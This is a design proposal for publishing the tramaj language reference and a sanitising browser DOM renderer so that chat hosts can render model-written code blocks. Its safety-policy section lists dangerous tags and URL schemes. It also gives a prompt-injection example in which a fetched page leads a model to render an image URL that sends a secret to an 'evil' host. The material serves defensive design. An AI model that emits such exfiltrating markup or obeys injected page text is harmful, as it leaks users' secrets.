# Tramaj — Publishing for chat hosts (reference sections, browser bundle, fenced blocks)

Status: **proposal, not implemented.** Nothing below exists yet in this
repository; this document says what tramaj should publish so that a chat
host can let a model *write* tramaj and *read* the language reference, and
what each of those costs this repository's release work.

The first host is agents-exe. It pins `tramaj-hs` at an old git tag, and its
`serve` UI is one hand-written vanilla-JavaScript page embedded in Haskell,
with no JavaScript toolchain. Its owner chose:

- **rendering, option B:** agents-exe bundles tramaj-js into that page and
  renders the ```` ```tramaj ```` fenced blocks in agent replies;
- **a reference tool:** a `TramajToolbox` builtin with `list_sections` and
  `read_section` over the language reference;
- **opt-in:** per agent, plus a `serve` flag that adds the toolbox to every
  served agent.

How agents-exe builds that toolbox, wires it, and lays out its page is
agents-exe's own spec (its feature `53dd1d01`). This document covers only the
tramaj side: what is published, how it is versioned, how a host gets it, and
what a fenced block means. Nothing here is specific to agents-exe; any chat
host may consume the same artifacts.

Each section answers one question and ends with a **Recommendation**. §6 is
the work it adds here, §7 the open questions.

---

## 1. The reference as addressable sections

### What is there now

- `reference.md` numbers its top-level sections `## 1.` to `## 14.`, and has
  four unnumbered `###` subsections: *Program kind* (in §5) and *Sorting*,
  *Number formatting*, *Arithmetic* (in §11).
- `node-json.md` numbers nothing: `## Node AST`, `## JSON encoding` (with
  `### Text`, `### Element`, `### Fragment`, `### Numbers`), `## Annotations`,
  `## Decoding`.
- The `## N.` numbers are already this repository's stable ids in practice:
  about 150 references of the form `reference.md §N` across the specs, the
  ports' source comments and the changelogs, and git history shows the
  fourteen numbered headings unchanged since the file was created
  (2026-08-27); only `###` subsections were ever added. `node-json.md` is
  cited by heading name (*Numbers*), not by number.
- Section sizes are uneven. §11 *Builtins* is about 330 lines, §5 *Surface
  syntax* about 120, §13 about 30. A `read_section` that can only return a
  whole `##` section returns a third of the file for "how does `sort-by`
  work".

### Options

1. **Rely on `## N.` numbering.** Free today, and stable so far. But it
   gives no id to `node-json.md` (unnumbered), none to the `###`
   subsections (the ones a model most wants: *Sorting*, *Arithmetic*), and
   an id built from a subsection's title (`11.sorting`) breaks when the
   title is reworded, which is exactly what the feature asks to avoid.
2. **Number everything** (`### 11.1 Sorting`, `## 3. Decoding` in
   node-json). Touches every heading and every `node-json.md *Numbers*`
   citation, and still couples the id to the position: inserting a
   subsection renumbers its siblings.
3. **Explicit anchors.** One HTML comment on the line before each heading:

   ```markdown
   <!-- section: builtins.sorting -->
   ### Sorting
   ```

   Invisible on GitHub and on the website (the comment passes through
   `website/scripts/sync-reference.sh` and the cmark renderer as raw HTML,
   to be checked once, §6). The title and the `§N` number can change
   freely; the id cannot.

### Recommendation

**Explicit anchors (option 3), keeping the `§N` numbers as they are.**

- **Id grammar.** Lowercase kebab-case words, `.` for nesting:
  `[a-z0-9]+(-[a-z0-9]+)*(\.[a-z0-9]+(-[a-z0-9]+)*)*`. The document is
  part of the address, not of the id: a host qualifies it as
  `reference/builtins.sorting`, `node-json/numbers`.
- **Every `##` and `###` heading in the two files has one**, plus one for
  the text before the first heading (`overview`), so that every line of
  each file belongs to exactly one section.
- **Ids are permanent.** A heading may be reworded, renumbered or moved; its
  id stays. A removed section's id is never reused. A split keeps the old
  id on the part that keeps the old meaning.
- **The `§N` numbers stay** as the human citation form, and the section
  list carries them (`"number": "11"`), so a host can accept `§11` from a
  model as well as `builtins`.

Proposed ids:

| file | id | heading |
|---|---|---|
| `reference.md` | `overview` | (title and preamble) |
| | `shape` | §1 Shape of the language |
| | `core-ast` | §2 Core AST |
| | `values` | §3 Values |
| | `node` | §4 Node (output) |
| | `syntax` | §5 Surface syntax |
| | `syntax.program-kind` | Program kind |
| | `evaluation` | §6 Evaluation |
| | `imports` | §7 Imports |
| | `desugaring` | §8 Desugaring |
| | `analysis` | §9 Static analysis |
| | `actions` | §10 Actions and adaptation |
| | `builtins` | §11 Builtins |
| | `builtins.sorting` | Sorting |
| | `builtins.number-formatting` | Number formatting |
| | `builtins.arithmetic` | Arithmetic |
| | `errors` | §12 Errors |
| | `implementation-defined` | §13 Implementation-defined |
| | `open` | §14 Open |
| `node-json.md` | `overview` | (title and preamble) |
| | `ast` | Node AST |
| | `encoding` | JSON encoding |
| | `encoding.text` | Text |
| | `encoding.element` | Element |
| | `encoding.fragment` | Fragment |
| | `encoding.numbers` | Numbers |
| | `annotations` | Annotations |
| | `decoding` | Decoding |

**A section list ships with the files** (§3), as `sections.json`, so that
no host has to parse Markdown to serve the two tools:

```json
{ "doc": "reference", "id": "builtins.sorting", "number": null,
  "title": "Sorting", "level": 3, "parent": "builtins",
  "children": [], "own": [660, 747], "full": [660, 747] }
```

`own` is the line range from the heading to the first child heading (the
section's own text); `full` runs to the next heading of the same or a
higher level (with its children). A host chooses which one `read_section`
returns; this document only guarantees both are there. The list is
generated from the anchors at release time, never written by hand.

`v3-symbols.md` and `v4-types.md` are left out for now (§7, Q5).

---

## 2. Versioning: which reference goes with which release

### What is there now

- There is no repository-wide version. Each package is tagged on its own
  (`tramaj-hs-v0.5.0.0`, `tramaj-js-v0.3.0`, `tramaj-react-v0.3.0`,
  `tramaj-go/v0.3.0`, …), and the package versions differ (Haskell 0.5.0.0,
  TypeScript 0.3.0 for the same language).
- The specs are not versioned either. The reference describes `main`, and
  its preamble says what is "on `main` and in no release yet". That
  preamble is **stale today**: it says the number split (§18) and sorting
  and formatting (§20) are in no release, while `tramaj-hs` 0.5.0.0 and
  `tramaj-js` 0.3.0 (and the 0.2.0 before it) ship them. A model reading
  that `overview` section through the tool would be told `sum` is unbound
  in any released version, which is false for the version it is using.
- Releases do come in rounds: `tramaj-hs-v0.5.0.0` and `tramaj-js-v0.3.0`
  were cut the same day, and the two specs differ between those two tags by
  four changed lines.

### Recommendation

- **The reference's version is the commit it was cut from.** No separate
  spec version number. The text of `specs/reference.md` and
  `specs/node-json.md` at a package's release tag is the reference for that
  release.
- **For a chat host, the release that matters is `tramaj-js`**, because the
  bundled tramaj-js is what evaluates the blocks the model writes (§5). So
  the reference is published with each `tramaj-js` release, from the
  `tramaj-js-vX.Y.Z` commit, in the same artifact as the bundle (§3). A
  host never mixes a reference from one tag with a bundle from another.
- **The mapping lives in the artifact**: a `manifest.json` next to the
  files, giving the `tramaj-js` version, the commit, and a sha256 of each
  file:

  ```json
  { "tramajJs": "0.3.1", "tramajDom": "0.3.1",
    "commit": "<sha of the tramaj-js-v0.3.1 tag>",
    "files": { "tramaj.browser.iife.min.js": "<sha256>",
               "reference.md": "<sha256>", "node-json.md": "<sha256>",
               "sections.json": "<sha256>" } }
  ```

- **The sibling tags of one release round are listed in `RELEASING.md`**, in
  a new *Release rounds* table (one row per round: `tramaj-hs`, `tramaj-js`,
  `tramaj-rs`, `tramaj-go`, `tramaj-py`, `tramaj-purs` tags). That table is
  how a host that also pins `tramaj-hs` (agents-exe does) picks the
  `tramaj-hs` tag that implements the same language as its bundle, and bumps
  both pins in one change.
- **The release checklist updates the reference's preamble** so it says what
  the release being cut contains, not what `main` once lacked. Fixing the
  current stale text is part of the first PR (§6).

---

## 3. How a host gets the reference

### Options

1. **A path in the published packages.** `tramaj-hs` is consumed as a git
   `subdir: tramaj-hs` or from Hackage, and `specs/` is outside that
   directory, so cabal cannot reach it; shipping it would mean copying the
   specs into `tramaj-hs` as `data-files` (two copies in the repository, or
   an sdist step). The npm package publishes `files: ["dist"]` only, and npm
   is behind: `tramaj-js` 0.2.0 is published, 0.3.0 is tagged and not
   (README, *Consuming from your own project*). Neither is a channel a
   host can rely on for the specs.
2. **Fetch at run time** from `raw.githubusercontent.com` at a tag. Needs
   the network when the host runs, which a local agent runner should not.
3. **A release asset**, built at the `tramaj-js` tag and attached to that
   tag's GitHub Release: `tramaj-browser-X.Y.Z.tar.gz` holding the bundle
   (§4), `reference.md`, `node-json.md`, `sections.json` and
   `manifest.json`. The host downloads it once per bump and **vendors** the
   files (checks them into its own tree), then embeds them at compile time.

### Recommendation

**Option 3: one release asset per `tramaj-js` release, vendored by the
host.** One download gives the bundle and the matching reference together,
which is what §2 asks for; the sha256 sums in `manifest.json` let the
host's fetch script check what it got; the host builds offline. This
matches how the repository already releases packages that have no
registry (`tramaj-hpdf` and `tramaj-go`: "the release is the git tag").

Until the first asset exists, a host can vendor `specs/reference.md` and
`specs/node-json.md` by hand from the raw URLs at a tag
(`https://raw.githubusercontent.com/lucasdicioccio/tramaj/tramaj-js-v0.3.0/specs/reference.md`).
Those copies have no anchors yet, so section ids derived from them are
provisional and will change once.

---

## 4. What a host bundles for rendering

### What is there now

- `@lucasdicioccio/tramaj-js` is ESM only, compiled by `tsc` into one
  `dist/*.js` file per module (`ast`, `parser`, `eval`, `json`, `node`,
  `analysis`, `types`), with no runtime dependencies and about 180 KB of
  TypeScript source. It has no DOM code, on purpose.
- The only fold to UI output is `tramaj-react`, which needs React. It also
  holds the host rendering decisions a DOM fold would need: `renderScalar`
  (integers and floats rendered as `str` writes them, symbols and terms as
  labels), `symbolLabel`, `termLabel`, `isValidAttrName`,
  `validateAttrNames`.
- `tramaj-react` sets every attribute the program wrote. That is fine in
  React (it ignores an `onclick` string, and does not run a `script`
  element it renders) but not in a vanilla DOM fold, where
  `setAttribute("onclick", …)` runs code and an appended `script` element
  executes.
- The repository root already has `esbuild` as a devDependency.

### Options

1. **agents-exe uses the npm ESM package as is.** It would have to serve a
   module graph from an embedded page, or run a one-off esbuild itself:
   that brings back the JavaScript toolchain agents-exe does not have, and
   the build is not reproducible from agents-exe's tree. It would also have
   to write its own DOM fold, re-deriving the number rendering, the symbol
   labels and attribute validation, and get the safety policy right on its
   own. And npm lags the tags (§3).
2. **tramaj ships a browser bundle only** (tramaj-js in one file). Solves
   the toolchain, not the fold.
3. **tramaj ships a DOM fold and a browser bundle of both.**

### Recommendation

**Option 3.** Concretely:

- **A new package `tramaj-dom/`** (TypeScript, depends on `tramaj-js`, no
  React, no runtime dependency beyond the DOM): the vanilla-DOM counterpart
  of `tramaj-react` and `tramaj-halogen`.
  - `foldToDom(doc: Document, node: Node, opts?): DocumentFragment` (a
    fragment, because a `Node` need not be one element);
  - the scalar rendering of `tramaj-react` (`renderScalar` and the two label
    recognizers), with the same results; which package owns the one copy is
    Q6 in §7;
  - **a safety policy, on by default**, because this fold renders text a
    model wrote, and a model's text can be steered by whatever it read:
    - tags from an allowlist of inert HTML (text structure, lists, tables,
      `a`, `img`, `code`/`pre`, `details`/`summary`, …); any other tag
      (`script`, `style`, `iframe`, `object`, `embed`, `form`, `input`,
      `link`, `meta`, `base`, `svg`, …) is refused;
    - attribute names must pass `isValidAttrName`, and `on*` and `style`
      are refused;
    - `href` takes `http:`, `https:`, `mailto:`, a relative URL or `#…`,
      and gets `rel="noopener noreferrer"`; anything else (`javascript:`,
      `data:`) is refused;
    - **attributes that load a remote resource** (`src`, `srcset`,
      `poster`, …) are refused by default. A model told by a page it
      fetched to render `img src="https://evil/?q=<secret>"` would otherwise
      send the secret out the moment the reply is shown. A host may allow
      them per origin (`opts.allowRemote`);
    - a refused tag or attribute fails the block (§5) instead of being
      dropped silently, so the model is told and can fix it;
    - a node-count cap (default 5,000) and a depth cap (default 64): an
      evaluation always terminates (no recursion, §6 of the reference), but
      `@a = [1, 1]` doubled ten times is already 1,024 nodes, so output size
      is not bounded by program size;
  - actions (`action(…)`) render with no handler; a host may pass a
    `dispatch` like `tramaj-react`'s, but the chat use has none (§5);
  - `renderFencedBlock(container: Element, source: string, opts?)`: the
    whole §5 contract in one call, so the host writes no tramaj logic at
    all: it finds the blocks and calls this.
- **A browser bundle**, built by `esbuild` from `tramaj-dom` (which pulls in
  `tramaj-js`), minified, in two forms:
  - `tramaj.browser.iife.min.js`, defining `globalThis.Tramaj`, so a page
    can inline it in a plain `<script>` tag. This is the form for a page
    embedded in a Haskell binary: no module URL to serve.
  - `tramaj.browser.esm.min.js`, the same surface as an ES module.

  The bundle exposes a small surface: `renderFencedBlock`, `foldToDom`,
  `parseProgram`, `runProgramWith`, `nodeFromJson`, `version`.
- Released by git tag and asset (§3), versioned **in lockstep with
  `tramaj-js`** (as `tramaj-react` already is: both at 0.3.0), tagged
  `tramaj-dom-vX.Y.Z` at the same commit as `tramaj-js-vX.Y.Z`. Publishing
  `tramaj-dom` to npm is deferred; when it happens, it goes after
  `tramaj-js`, like `tramaj-react` (RELEASING.md §4).

---

## 5. The fenced-block contract

What a chat host does with a block, so that every host renders the same
reply the same way and a model can be told one rule.

- **Which blocks.** A fenced code block whose info string's first word is
  exactly `tramaj`. Other words after it are reserved (§7, Q1) and ignored
  for now. Any other block is not tramaj.
- **What it holds: a program,** in the surface syntax (`reference.md` §5):
  bindings, then a root expression. Not Node JSON: the point is that the
  model writes the language, and Node JSON is the evaluator's output, not
  something to type by hand. (A separate info string for Node JSON is Q2.)
- **How it is evaluated: one fixed profile.**
  - concrete mode (`v3-symbols.md` §5); a `?(…)` allocation fails with
    `SymbolsUnavailable`;
  - **the arithmetic profile on** (`reference.md` §11): it is ten pure
    names, and a model that reads the reference will use `sum`; with it off,
    every such reply fails on `UnboundName`;
  - the context `$ctx` is the empty object `{}`; data the program needs is
    written in it (`@rows = [...]`). Passing data in is Q1;
  - an empty library table: `import(…)` fails with `UnknownLibrary`;
  - annotations are ignored by the fold.
- **What is shown on success.**
  - A program whose result is a document: the folded DOM (§4) in the
    block's place.
  - A program whose result is a plain value: that value as JSON, written by
    `tramaj-js`'s `stringify` (so `3.0` stays `3.0`), in a `pre`, marked as
    a value.
  - Either way, a control to show the source.
- **What is shown on failure.** Never the program's output partly rendered,
  never raw HTML, and never an exception out of the block: the rest of the
  reply renders normally. Instead, a panel with:
  - the kind: *parse error* (with `ParseError`'s line and column), the
    `EvalErrorKind` (`PathNotFound`, `TypeMismatch`, …, `reference.md` §12),
    *refused by the safety policy* (naming the tag or attribute), or *too
    large* (which cap);
  - the message, as the implementation wrote it (its wording is
    implementation-defined, `reference.md` §13, so a host shows it and does
    not parse it);
  - the source, shown.
- **When.** A block is evaluated once it is complete (the closing fence has
  arrived). While a reply is still streaming, an open block shows its
  source as code.
- **Same source, same result.** Evaluation is deterministic and the profile
  is fixed, so a block renders identically on every reload and in every
  host that follows this section.

`renderFencedBlock` (§4) is this section as code, and its tests are this
section as cases.

---

## 6. Work this adds to tramaj

In order; each is one PR.

1. **Section anchors.** The anchors of §1 in `reference.md` and
   `node-json.md`; a check script (every `##`/`###` heading has an anchor
   on the line before it, ids match the grammar and are unique, no id is
   removed relative to the last release tag) run alongside the other
   checks; confirm the comments are invisible on the generated website
   pages. Fix the stale preamble of `reference.md` (§2).
2. **`tramaj-dom`.** The fold, the policy, `renderFencedBlock`, tests in
   jsdom (as `tramaj-react` already does), including the policy cases and
   one case per failure kind of §5.
3. **Bundle and asset.** A script that builds the two bundles with
   `esbuild`, generates `sections.json` from the anchors, writes
   `manifest.json`, and packs `tramaj-browser-X.Y.Z.tar.gz`; a smoke test
   that loads the IIFE bundle in jsdom and renders one block.
4. **Release process.** In `RELEASING.md`: the *Release rounds* table (§2);
   the `tramaj-dom` steps (lockstep version, tag at the `tramaj-js` commit);
   building the asset and attaching it with `gh release create
   tramaj-js-vX.Y.Z … tramaj-browser-X.Y.Z.tar.gz` (the repository makes
   no GitHub Releases today, only tags; this is the one new habit); and the
   preamble check. A `website/src/changelog-tramaj-dom.cmark` page like the
   other packages'.

The first asset comes with the next `tramaj-js` release after these land
(`tramaj-js-v0.3.0` is already tagged and does not contain `tramaj-dom`).

---

## 7. Open questions

- **Q1. Data for a block.** `$ctx` is `{}` (§5). Should a block be able to
  take a context: a JSON block right before it, or an info-string attribute
  (```` ```tramaj ctx=… ````)? Recommendation: not in the first version;
  bindings cover what a model writes by hand.
- **Q2. Node JSON blocks.** A second info string (```` ```tramaj-node ````)
  for a document produced elsewhere, e.g. by a tool evaluating with
  `tramaj-hs` on the server. Recommendation: wait for a tool that needs it.
- **Q3. The arithmetic profile by default.** Recommended on (§5). A program
  that works in the chat then fails on a host that leaves it off; the error
  is a clear `UnboundName`. Needs the owner's yes.
- **Q4. Remote resources.** Refused by default (§4). If images in replies
  are wanted, which origins does agents-exe allow, and is that a `serve`
  flag?
- **Q5. Which documents are sections.** `reference.md` and `node-json.md`
  only, as the feature asks. `v3-symbols.md` and `v4-types.md` are long and
  matter only to symbolic and typed programs, which the chat profile does
  not run. And should the dense cheatsheet of
  `website/src/howto-agents.cmark` be a third, short document, the one a
  model reads first?
- **Q6. One copy of `renderScalar`.** `tramaj-dom` needs what `tramaj-react`
  has. Either `tramaj-dom` owns it and `tramaj-react` imports it (a new
  dependency for `tramaj-react`), or it moves to `tramaj-js` (which then
  holds a host rendering decision it so far leaves to hosts), or each keeps
  a copy held equal by shared test cases. Recommendation: `tramaj-dom` owns
  it; decide before step 2 of §6.
- **Q7. Running the evaluator off the main thread.** Evaluation terminates
  and §4 caps the output, but a large `map` still runs on the page's
  thread. A Web Worker would isolate it at the cost of a second entry point
  in the bundle. Recommendation: not in the first version.
